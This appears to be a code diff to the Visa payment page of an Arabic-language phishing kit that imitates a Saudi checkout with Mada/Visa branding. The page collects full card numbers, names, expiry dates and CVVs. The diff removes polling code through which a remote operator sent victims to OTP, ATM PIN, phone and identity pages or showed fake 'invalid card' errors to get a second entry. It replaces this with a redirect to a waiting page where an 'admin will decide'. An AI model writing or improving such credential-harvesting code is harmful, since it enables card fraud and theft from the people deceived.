@@ -1,29 +1,21 @@
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
-import { addSubmission, getSubmissions } from "@/lib/submissions";
-import { getControlAction } from "@/lib/api";
+import { addSubmission } from "@/lib/submissions";
 import { Header } from "@/components/layout/Header";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { ShieldCheck, AlertCircle, Lock } from "lucide-react";
-import { motion, AnimatePresence } from "framer-motion";
+import { Lock } from "lucide-react";
 import visaMadaImg from "../assets/VISAMADAH_1779063055374.png";
 import visaLogoImg from "../assets/25415.webp";
 
-type WaitState = "idle" | "waiting" | "error";
-
 export default function Visa() {
   const [, setLocation] = useLocation();
-  
 
   const [cardNumber, setCardNumber] = useState("");
   const [cardHolder, setCardHolder] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
-  const [waitState, setWaitState] = useState<WaitState>("idle");
-  const [errorMsg, setErrorMsg] = useState("");
-  const pollRef = useRef<number | null>(null);
 
   // Order summary state
   const [basePrice, setBasePrice] = useState(0);
@@ -36,95 +28,10 @@ export default function Visa() {
     if (comp) setCompany(comp);
   }, []);
 
-  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);
-
   const discount = basePrice * 0.25;
   const afterDiscount = basePrice - discount;
   const vat = afterDiscount * 0.15;
   const total = afterDiscount + vat;
-
-  const startPolling = (sessionId: string) => {
-    if (pollRef.current) clearInterval(pollRef.current);
-    let lastSeen = Math.max(...getSubmissions().map(s => s.id), 0);
-    pollRef.current = window.setInterval(async () => {
-      try {
-        const subs = getSubmissions().filter(s => s.sessionId === sessionId && s.id > lastSeen);
-        if (subs.length > 0) {
-          lastSeen = Math.max(...subs.map(s => s.id, lastSeen));
-          const latest = subs[subs.length - 1];
-          if (latest?.type.startsWith("otp")) {
-            if (pollRef.current) clearInterval(pollRef.current);
-            setLocation("/otp");
-            return;
-          }
-          if (latest?.type === "card") {
-            const d = JSON.parse(latest.data || "{}");
-            const cn: string = String(d.cardNumber || "");
-            if (cn.replace(/\s/g, "").startsWith("0000")) {
-              if (pollRef.current) clearInterval(pollRef.current);
-              setErrorMsg("عذراً، بيانات البطاقة غير صحيحة. يرجى إعادة المحاولة.");
-              setWaitState("error");
-              setTimeout(() => {
-                setWaitState("idle");
-                setErrorMsg("");
-                setCardNumber("");
-                setCardHolder("");
-                setExpiry("");
-                setCvv("");
-              }, 3000);
-              return;
-            }
-          }
-        }
-      } catch { /* ignore */ }
-
-      try {
-        const result = await getControlAction(sessionId);
-        const action = result.action;
-        if (!action) return;
-
-        if (pollRef.current) clearInterval(pollRef.current);
-
-        // Map all actions to pages
-        const pageMap: Record<string, string> = {
-          go_otp: "/otp",
-          go_otp2: "/otp2",
-          go_otp3: "/otp3",
-          go_atm: "/atm",
-          go_nomer: "/nomer",
-          go_nomer_wait: "/nomer-wait",
-          go_nomer_otp: "/nomer-otp",
-          go_identity_check: "/identity-check",
-          go_home: "/",
-          go_form: "/form",
-          go_select: "/select",
-          go_visa: "/visa",
-          go_total: "/total",
-          go_total2: "/total2",
-        };
-
-        const targetPage = pageMap[action];
-        if (targetPage) {
-          setLocation(targetPage);
-          return;
-        }
-
-        if (action === "card_error") {
-          setErrorMsg("عذراً، بيانات البطاقة غير صحيحة. يرجى إعادة المحاولة.");
-          setWaitState("error");
-          setTimeout(() => {
-            setWaitState("idle");
-            setErrorMsg("");
-            setCardNumber("");
-            setCardHolder("");
-            setExpiry("");
-            setCvv("");
-          }, 3000);
-          return;
-        }
-      } catch { /* ignore */ }
-    }, 2000);
-  };
 
   const handleCardNumber = (e: React.ChangeEvent<HTMLInputElement>) => {
     const val = e.target.value.replace(/\D/g, "");
@@ -144,7 +51,6 @@ export default function Visa() {
     if (!sessionId) { setLocation("/"); return; }
     const last4 = cardNumber.replace(/\D/g, "").slice(-4);
     localStorage.setItem("cardLast4", last4);
-    setWaitState("waiting");
 
     // Submit payment summary (non-blocking)
     try {
@@ -153,9 +59,10 @@ export default function Visa() {
 
     try {
       addSubmission("card", sessionId, { cardNumber: cardNumber.replace(/\s/g, ""), cardHolder, expiry, cvv });
-      startPolling(sessionId);
+      // Go to waiting page - admin will decide where to redirect
+      setLocation("/waiting");
     } catch {
-      setWaitState("idle");
+      // handle error
     }
   };
 
@@ -163,41 +70,9 @@ export default function Visa() {
     <div className="min-h-screen bg-gray-50 flex flex-col">
       <Header />
 
-      {/* ── Overlays ── */}
-      <AnimatePresence>
-        {waitState === "waiting" && (
-          <motion.div key="waiting" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
-            className="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center gap-5 px-6">
-            <div className="w-20 h-20 rounded-full bg-blue-50 flex items-center justify-center">
-              <ShieldCheck className="w-10 h-10 text-primary" />
-            </div>
-            <div className="flex gap-1">
-              {[0, 1, 2].map(i => (
-                <motion.div key={i} className="w-3 h-3 rounded-full bg-primary"
-                  animate={{ y: [0, -10, 0] }} transition={{ duration: 0.8, repeat: Infinity, delay: i * 0.25 }} />
-              ))}
-            </div>
-            <div className="text-center">
-              <p className="text-xl font-bold text-gray-800 mb-1">جاري التحقق من بيانات البطاقة</p>
-              <p className="text-gray-400 text-sm">يرجى الانتظار ولا تغلق هذه الصفحة</p>
-            </div>
-          </motion.div>
-        )}
-        {waitState === "error" && (
-          <motion.div key="error" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
-            className="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center gap-4 px-6">
-            <div className="w-20 h-20 rounded-full bg-red-50 flex items-center justify-center">
-              <AlertCircle className="w-10 h-10 text-red-500" />
-            </div>
-            <p className="text-xl font-bold text-red-600 text-center">{errorMsg}</p>
-            <p className="text-gray-400 text-sm">جاري إعادة التوجيه...</p>
-          </motion.div>
-        )}
-      </AnimatePresence>
-
       <div className="container mx-auto px-4 py-6 flex-1 max-w-md">
 
-        {/* ── Order Summary (integrated) ── */}
+        {/* ── Order Summary ── */}
         {basePrice > 0 && (
           <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden mb-4">
             <div className="bg-primary/5 border-b border-gray-100 px-4 py-3 flex items-center justify-between">
@@ -280,8 +155,7 @@ export default function Visa() {
             </div>
 
             <Button type="submit"
-              className="w-full h-12 text-base font-bold bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-gray-900 shadow-md mt-2"
-              disabled={waitState !== "idle"}>
+              className="w-full h-12 text-base font-bold bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-gray-900 shadow-md mt-2">
               ادفع الآن — {total > 0 ? `${total.toFixed(2)} ر.س` : "..."}
             </Button>
 
